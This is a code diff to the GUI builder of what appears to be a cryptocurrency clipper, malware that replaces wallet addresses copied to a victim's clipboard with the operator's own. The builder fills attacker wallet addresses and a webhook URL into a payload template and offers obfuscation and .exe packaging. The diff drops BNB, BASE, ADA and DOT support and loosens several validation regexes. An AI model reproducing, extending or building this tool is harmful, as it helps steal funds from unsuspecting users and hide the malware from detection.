@@ -22,14 +22,10 @@ btc_address_pattern = r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
 eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
 xmr_address_pattern = r"^4[0-9AB][0-9a-zA-Z]{93}$"
 ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
-sol_address_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
-doge_address_pattern = r"^D[5-9A-HJ-NP-Ua-km-z]{33,34}$"
-bnb_address_pattern = r"^bnb1[0-9a-z]{38}$"
-base_address_pattern = r"^0x[a-fA-F0-9]{40}$"
-ada_address_pattern = r"^addr1[0-9a-z]{58,59}$"
-dot_address_pattern = r"^1[a-km-zA-HJ-NP-Z1-9]{47}$"
-xrp_address_pattern = r"^r[1-9A-HJ-NP-Za-km-z]{25,35}$"
-trx_address_pattern = r"^T[1-9A-HJ-NP-Za-km-z]{33}$"
+sol_address_pattern = r"^(?:[a-zA-Z0-9]){44}$"
+doge_address_pattern = r"^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$"
+xrp_address_pattern = r"r[0-9a-zA-Z]{24,34}$"
+trx_address_pattern = r"^T[a-zA-Z0-9]{33}$"
 
 customtkinter.set_appearance_mode("dark")
 
@@ -107,9 +103,7 @@ class toplevel:
 class resetconfig:
     def reset(btc_addr, eth_addr, xmr_addr, 
               ltc_addr, sol_addr, doge_addr,
-              bnb_addr, base_addr, ada_addr,
-              dot_addr, xrp_addr, trx_addr,
-              webhook_url):
+              xrp_addr, trx_addr, webhook_url):
         global icon_path
 
         icon_path = ""
@@ -120,15 +114,11 @@ class resetconfig:
         set_config_btn.configure(text="set config", fg_color="green", hover_color="#063b00", state="normal", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, 
                                                                                                                                                            btc_addr, eth_addr, xmr_addr, 
                                                                                                                                                            ltc_addr, sol_addr, doge_addr,
-                                                                                                                                                           bnb_addr, base_addr, ada_addr,
-                                                                                                                                                           dot_addr, xrp_addr, trx_addr,
-                                                                                                                                                           webhook_url))
+                                                                                                                                                           xrp_addr, trx_addr, webhook_url))
         config_set_lbl.configure(text="config not set", text_color="red")
         check_valid_btn.configure(text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, 
                                                                                                                 ltc_addr, sol_addr, doge_addr,
-                                                                                                                bnb_addr, base_addr, ada_addr,
-                                                                                                                dot_addr, xrp_addr, trx_addr,
-                                                                                                                webhook_url), state="normal")
+                                                                                                                xrp_addr, trx_addr, webhook_url), state="normal")
         exe_file_checkbox.deselect()
         obfuscate_checkbox.deselect()
         single_use_checkbox.deselect()
@@ -193,11 +183,7 @@ class build:
         ltc_addr = ltc_addr1
         xmr_addr = xmr_addr1
         sol_addr = sol_addr1
-        doge_addr = doge_addr1
-        bnb_addr = bnb_addr1
-        base_addr = base_addr1
-        ada_addr = ada_addr1
-        dot_addr = dot_addr1    
+        doge_addr = doge_addr1  
         xrp_addr = xrp_addr1
         trx_addr = trx_addr1
 
@@ -213,14 +199,6 @@ class build:
             sol_addr = "SET SOL ADDRESS HERE"
         if doge_addr == "":
             doge_addr = "SET DOGE ADDRESS HERE"
-        if bnb_addr == "":
-            bnb_addr = "SET BNB ADDRESS HERE"
-        if base_addr == "":
-            base_addr = "SET BASE ADDRESS HERE"
-        if ada_addr == "":
-            ada_addr = "SET ADA ADDRESS HERE"
-        if dot_addr == "":
-            dot_addr = "SET DOT ADDRESS HERE"
         if xrp_addr == "":
             xrp_addr = "SET XRP ADDRESS HERE"
         if trx_addr == "":
@@ -242,10 +220,6 @@ class build:
         script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
         script_content = script_content.replace('soladdr = "SET SOL ADDRESS HERE"', f"soladdr = '{sol_addr}'")
         script_content = script_content.replace('dogeaddr = "SET DOGE ADDRESS HERE"', f"dogeaddr = '{doge_addr}'")
-        script_content = script_content.replace('bnbaddr = "SET BNB ADDRESS HERE"', f"bnbaddr = '{bnb_addr}'")
-        script_content = script_content.replace('baseaddr = "SET BASE ADDRESS HERE"', f"baseaddr = '{base_addr}'")
-        script_content = script_content.replace('adaaddr = "SET ADA ADDRESS HERE"', f"adaaddr = '{ada_addr}'")
-        script_content = script_content.replace('dotaddr = "SET DOT ADDRESS HERE"', f"dotaddr = '{dot_addr}'")
         script_content = script_content.replace('xrpaddr = "SET XRP ADDRESS HERE"', f"xrpaddr = '{xrp_addr}'")
         script_content = script_content.replace('trxaddr = "SET TRX ADDRESS HERE"', f"trxaddr = '{trx_addr}'")
 
@@ -291,11 +265,7 @@ class build:
         ltc_addr = ltc_addr1
         xmr_addr = xmr_addr1
         sol_addr = sol_addr1
-        doge_addr = doge_addr1
-        bnb_addr = bnb_addr1
-        base_addr = base_addr1
-        ada_addr = ada_addr1
-        dot_addr = dot_addr1    
+        doge_addr = doge_addr1  
         xrp_addr = xrp_addr1
         trx_addr = trx_addr1
 
@@ -311,14 +281,6 @@ class build:
             sol_addr = "SET SOL ADDRESS HERE"
         if doge_addr == "":
             doge_addr = "SET DOGE ADDRESS HERE"
-        if bnb_addr == "":
-            bnb_addr = "SET BNB ADDRESS HERE"
-        if base_addr == "":
-            base_addr = "SET BASE ADDRESS HERE"
-        if ada_addr == "":
-            ada_addr = "SET ADA ADDRESS HERE"
-        if dot_addr == "":
-            dot_addr = "SET DOT ADDRESS HERE"
         if xrp_addr == "":
             xrp_addr = "SET XRP ADDRESS HERE"
         if trx_addr == "":
@@ -340,10 +302,6 @@ class build:
         script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
         script_content = script_content.replace('soladdr = "SET SOL ADDRESS HERE"', f"soladdr = '{sol_addr}'")
         script_content = script_content.replace('dogeaddr = "SET DOGE ADDRESS HERE"', f"dogeaddr = '{doge_addr}'")
-        script_content = script_content.replace('bnbaddr = "SET BNB ADDRESS HERE"', f"bnbaddr = '{bnb_addr}'")
-        script_content = script_content.replace('baseaddr = "SET BASE ADDRESS HERE"', f"baseaddr = '{base_addr}'")
-        script_content = script_content.replace('adaaddr = "SET ADA ADDRESS HERE"', f"adaaddr = '{ada_addr}'")
-        script_content = script_content.replace('dotaddr = "SET DOT ADDRESS HERE"', f"dotaddr = '{dot_addr}'")
         script_content = script_content.replace('xrpaddr = "SET XRP ADDRESS HERE"', f"xrpaddr = '{xrp_addr}'")
         script_content = script_content.replace('trxaddr = "SET TRX ADDRESS HERE"', f"trxaddr = '{trx_addr}'")
 
@@ -389,11 +347,7 @@ class build:
         ltc_addr = ltc_addr1
         xmr_addr = xmr_addr1
         sol_addr = sol_addr1
-        doge_addr = doge_addr1
-        bnb_addr = bnb_addr1
-        base_addr = base_addr1
-        ada_addr = ada_addr1
-        dot_addr = dot_addr1    
+        doge_addr = doge_addr1  
         xrp_addr = xrp_addr1
         trx_addr = trx_addr1
 
@@ -409,14 +363,6 @@ class build:
             sol_addr = "SET SOL ADDRESS HERE"
         if doge_addr == "":
             doge_addr = "SET DOGE ADDRESS HERE"
-        if bnb_addr == "":
-            bnb_addr = "SET BNB ADDRESS HERE"
-        if base_addr == "":
-            base_addr = "SET BASE ADDRESS HERE"
-        if ada_addr == "":
-            ada_addr = "SET ADA ADDRESS HERE"
-        if dot_addr == "":
-            dot_addr = "SET DOT ADDRESS HERE"
         if xrp_addr == "":
             xrp_addr = "SET XRP ADDRESS HERE"
         if trx_addr == "":
@@ -438,10 +384,6 @@ class build:
         script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
         script_content = script_content.replace('soladdr = "SET SOL ADDRESS HERE"', f"soladdr = '{sol_addr}'")
         script_content = script_content.replace('dogeaddr = "SET DOGE ADDRESS HERE"', f"dogeaddr = '{doge_addr}'")
-        script_content = script_content.replace('bnbaddr = "SET BNB ADDRESS HERE"', f"bnbaddr = '{bnb_addr}'")
-        script_content = script_content.replace('baseaddr = "SET BASE ADDRESS HERE"', f"baseaddr = '{base_addr}'")
-        script_content = script_content.replace('adaaddr = "SET ADA ADDRESS HERE"', f"adaaddr = '{ada_addr}'")
-        script_content = script_content.replace('dotaddr = "SET DOT ADDRESS HERE"', f"dotaddr = '{dot_addr}'")
         script_content = script_content.replace('xrpaddr = "SET XRP ADDRESS HERE"', f"xrpaddr = '{xrp_addr}'")
         script_content = script_content.replace('trxaddr = "SET TRX ADDRESS HERE"', f"trxaddr = '{trx_addr}'")
 
@@ -489,9 +431,7 @@ class buildclipperconfig:
     def set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, 
                    btc_addr, eth_addr, xmr_addr, 
                    ltc_addr, sol_addr, doge_addr,
-                   bnb_addr, base_addr, ada_addr,
-                   dot_addr, xrp_addr, trx_addr,
-                   webhook_url):
+                   xrp_addr, trx_addr, webhook_url):
         global type, single_use, obfuscate, exe_file, ping
 
         type = str(clipper_type.get())
@@ -514,22 +454,17 @@ class buildclipperconfig:
                 config_set_lbl.configure(text="config set", text_color="green")
                 set_config_btn.configure(text="reset config", fg_color="red", hover_color="#8B0000", command=lambda: resetconfig.reset(btc_addr, eth_addr, xmr_addr, 
                                                                                                                                        ltc_addr, sol_addr, doge_addr,
-                                                                                                                                       bnb_addr, base_addr, ada_addr,
-                                                                                                                                       dot_addr, xrp_addr, trx_addr,
-                                                                                                                                       webhook_url))
+                                                                                                                                        xrp_addr, trx_addr, webhook_url))
 class buildgui:
     def check_addr_valid(btc_addr, eth_addr, xmr_addr, 
                          ltc_addr, sol_addr, doge_addr,
-                         bnb_addr, base_addr, ada_addr,
-                         dot_addr, xrp_addr, trx_addr,
-                         webhook_url):
+                         xrp_addr, trx_addr, webhook_url):
         if buildclipperconfig.class_called == 0:
             CTkMessagebox(title="error", message="please set a config", icon="cancel")
 
         else:
             global btc_addr1, eth_addr1, xmr_addr1, ltc_addr1, webhook_url1
-            global sol_addr1, doge_addr1, bnb_addr1, base_addr1
-            global ada_addr1, dot_addr1, xrp_addr1, trx_addr1
+            global sol_addr1, doge_addr1, xrp_addr1, trx_addr1
 
             btc_addr1 = str(btc_addr.get()).strip()
             eth_addr1 = str(eth_addr.get()).strip()
@@ -537,10 +472,6 @@ class buildgui:
             ltc_addr1 = str(ltc_addr.get()).strip()
             sol_addr1 = str(sol_addr.get()).strip()
             doge_addr1 = str(doge_addr.get()).strip()
-            bnb_addr1 = str(bnb_addr.get()).strip()
-            base_addr1 = str(base_addr.get()).strip()
-            ada_addr1 = str(ada_addr.get()).strip()
-            dot_addr1 = str(dot_addr.get()).strip()
             xrp_addr1 = str(xrp_addr.get()).strip()
             trx_addr1 = str(trx_addr.get()).strip()
 
@@ -581,26 +512,6 @@ class buildgui:
                             doge_addr.configure(border_color="green")
                         else:
                             doge_addr.configure(border_color="red")
-                    if bnb_addr1 != "":
-                        if re.match(bnb_address_pattern, bnb_addr1):
-                            bnb_addr.configure(border_color="green")
-                        else:
-                            bnb_addr.configure(border_color="red")
-                    if base_addr1 != "":
-                        if re.match(base_address_pattern, base_addr1):
-                            base_addr.configure(border_color="green")
-                        else:
-                            base_addr.configure(border_color="red")
-                    if ada_addr1 != "":
-                        if re.match(ada_address_pattern, ada_addr1):
-                            ada_addr.configure(border_color="green")
-                        else:
-                            ada_addr.configure(border_color="red")
-                    if dot_addr1 != "":
-                        if re.match(dot_address_pattern, dot_addr1):
-                            dot_addr.configure(border_color="green")
-                        else:
-                            dot_addr.configure(border_color="red")
                     if xrp_addr1 != "":
                         if re.match(xrp_address_pattern, xrp_addr1):
                             xrp_addr.configure(border_color="green")
@@ -666,14 +577,6 @@ class buildgui:
         sol_addr.pack(fill="x", padx=5, pady=5)
         doge_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="DOGE address (leave empty if none): ")
         doge_addr.pack(fill="x", padx=5, pady=0)
-        bnb_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="BNB address (leave empty if none): ")
-        bnb_addr.pack(fill="x", padx=5, pady=5)
-        base_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="BASE address (leave empty if none): ")
-        base_addr.pack(fill="x", padx=5, pady=0)
-        ada_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="ADA address (leave empty if none): ")
-        ada_addr.pack(fill="x", padx=5, pady=5)
-        dot_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="DOT address (leave empty if none): ")
-        dot_addr.pack(fill="x", padx=5, pady=0)
         xrp_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="XRP address (leave empty if none): ")
         xrp_addr.pack(fill="x", padx=5, pady=5)
         trx_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="TRX address (leave empty if none): ")
@@ -686,9 +589,7 @@ class buildgui:
 
         check_valid_btn = customtkinter.CTkButton(master=main_frame, text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, 
                                                                                                                                                    ltc_addr, sol_addr, doge_addr,
-                                                                                                                                                   bnb_addr, base_addr, ada_addr,
-                                                                                                                                                   dot_addr, xrp_addr, trx_addr,
-                                                                                                                                                   webhook_url), state="normal")
+                                                                                                                                                   xrp_addr, trx_addr, webhook_url), state="normal")
         check_valid_btn.pack(fill="x", padx=5, pady=5)
         fix_icons = customtkinter.CTkButton(master=main_frame, text="fix icons if not showing on .exe", command=lambda: attempt_fix_icons.thread())
         fix_icons.pack(fill="x", padx=5, pady=0)
@@ -719,9 +620,7 @@ class buildgui:
         set_config_btn = customtkinter.CTkButton(master=option_frame, fg_color="green", hover_color="#063b00", text="set config", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, 
                                                                                                                                                                                 btc_addr, eth_addr, xmr_addr, 
                                                                                                                                                                                 ltc_addr, sol_addr, doge_addr,
-                                                                                                                                                                                bnb_addr, base_addr, ada_addr,
-                                                                                                                                                                                dot_addr, xrp_addr, trx_addr,
-                                                                                                                                                                                webhook_url))
+                                                                                                                                                                                xrp_addr, trx_addr, webhook_url))
         set_config_btn.pack(fill="x", padx=10, pady=0)
         config_set_lbl = customtkinter.CTkLabel(master=option_frame, text="config not set", text_color="red")
         config_set_lbl.pack()
